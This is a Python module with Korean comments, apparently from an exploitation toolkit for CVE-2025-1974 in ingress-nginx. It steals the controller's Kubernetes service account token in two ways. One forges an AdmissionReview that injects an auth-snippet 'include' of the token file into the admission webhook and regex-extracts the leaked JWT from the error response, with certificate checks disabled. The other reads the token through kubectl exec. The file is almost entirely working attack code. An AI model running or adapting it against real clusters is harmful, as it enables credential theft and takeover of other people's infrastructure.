"""
SA 토큰 추출 모듈 — CVE-2025-1974 시나리오 B

두 가지 방법으로 ingress-nginx 컨트롤러 SA 토큰을 추출한다.
  방법 1 (webhook_error): auth-snippet 에러 응답에서 JWT 패턴 정규식 추출
  방법 2 (kubectl_exec):  kubectl exec으로 파드에서 직접 파일 읽기 (현실적 fallback)
"""

import base64
import json
import re
import ssl
import subprocess
import uuid
import urllib.request
import urllib.error
from dataclasses import dataclass, field


SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
INGRESS_NGINX_NS = "ingress-nginx"
CONTROLLER_SELECTOR = "app.kubernetes.io/component=controller"


@dataclass
class TokenResult:
    raw_token: str
    header: dict
    payload: dict
    sa_name: str
    namespace: str
    method_used: str       # "webhook_error" | "kubectl_exec"
    extract_success: bool
    error: str = ""


def decode_jwt(token_str: str) -> tuple[dict, dict]:
    """JWT 헤더와 페이로드를 (header, payload) tuple로 반환."""
    parts = token_str.split(".")
    if len(parts) < 2:
        return {}, {}

    def _decode(b64: str) -> dict:
        padding = 4 - len(b64) % 4
        try:
            return json.loads(base64.urlsafe_b64decode(b64 + "=" * padding))
        except Exception:
            return {}

    return _decode(parts[0]), _decode(parts[1])


def _make_ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send_auth_snippet(target: str, token_path: str) -> str:
    """auth-snippet include 주입 후 webhook 응답 메시지 반환."""
    payload = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "token-extract",
            "namespace": "default",
            "operation": "CREATE",
            "userInfo": {"username": "attacker", "groups": ["system:unauthenticated"]},
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": "token-extract",
                    "namespace": "default",
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-url": "http://127.0.0.1:9999/auth",
                        "nginx.ingress.kubernetes.io/auth-snippet": f"include {token_path};",
                    },
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [{
                        "host": "extract.local",
                        "http": {"paths": [{
                            "path": "/", "pathType": "Prefix",
                            "backend": {"service": {"name": "svc", "port": {"number": 80}}},
                        }]},
                    }],
                },
            },
        },
    }
    url = f"{target}/networking/v1/ingresses"
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    ctx = _make_ssl_ctx()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            data = json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read())
        except Exception:
            return ""
    except Exception:
        return ""

    return (
        data.get("response", {}).get("status", {}).get("message")
        or data.get("response", {}).get("result", {}).get("message")
        or ""
    )


def extract_via_webhook_error(
    target: str,
    token_path: str = SA_TOKEN_PATH,
) -> "TokenResult | None":
    """webhook 에러 메시지에서 JWT(eyJ...) 패턴을 정규식으로 추출한다."""
    msg = _send_auth_snippet(target, token_path)
    if not msg:
        return None

    tokens = re.findall(r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+", msg)
    if not tokens:
        return None

    raw = tokens[0]
    header, payload = decode_jwt(raw)
    return TokenResult(
        raw_token=raw,
        header=header,
        payload=payload,
        sa_name=payload.get("kubernetes.io/serviceaccount/name", ""),
        namespace=payload.get("kubernetes.io/serviceaccount/namespace", ""),
        method_used="webhook_error",
        extract_success=True,
    )


def _get_controller_pod(namespace: str = INGRESS_NGINX_NS) -> str | None:
    try:
        out = subprocess.check_output(
            ["kubectl", "get", "pods", "-n", namespace,
             "-l", CONTROLLER_SELECTOR, "-o", "name"],
            stderr=subprocess.DEVNULL,
        ).decode().strip().splitlines()
        return out[0] if out else None
    except Exception:
        return None


def extract_via_kubectl_exec(
    namespace: str = INGRESS_NGINX_NS,
    token_path: str = SA_TOKEN_PATH,
) -> "TokenResult | None":
    """kubectl exec으로 컨트롤러 파드에서 토큰 파일을 직접 읽는다."""
    pod = _get_controller_pod(namespace)
    if not pod:
        return TokenResult(
            raw_token="", header={}, payload={},
            sa_name="", namespace="",
            method_used="kubectl_exec",
            extract_success=False,
            error=f"컨트롤러 파드를 찾을 수 없음 (ns={namespace})",
        )

    try:
        raw = subprocess.check_output(
            ["kubectl", "exec", "-n", namespace, pod, "--", "cat", token_path],
            stderr=subprocess.DEVNULL,
        ).decode().strip()
    except Exception as e:
        return TokenResult(
            raw_token="", header={}, payload={},
            sa_name="", namespace="",
            method_used="kubectl_exec",
            extract_success=False,
            error=str(e),
        )

    header, payload = decode_jwt(raw)
    return TokenResult(
        raw_token=raw,
        header=header,
        payload=payload,
        sa_name=payload.get("kubernetes.io/serviceaccount/name", ""),
        namespace=payload.get("kubernetes.io/serviceaccount/namespace", ""),
        method_used="kubectl_exec",
        extract_success=bool(raw),
    )


def extract_token(
    target: str,
    prefer_method: str = "kubectl_exec",
) -> "TokenResult | None":
    """
    prefer_method 순서로 두 방법을 시도한다.
    첫 번째 성공 결과를 반환. 둘 다 실패하면 None.
    """
    methods = (
        ["kubectl_exec", "webhook_error"]
        if prefer_method == "kubectl_exec"
        else ["webhook_error", "kubectl_exec"]
    )

    for method in methods:
        if method == "kubectl_exec":
            result = extract_via_kubectl_exec()
        else:
            result = extract_via_webhook_error(target)

        if result and result.extract_success:
            return result

    return None
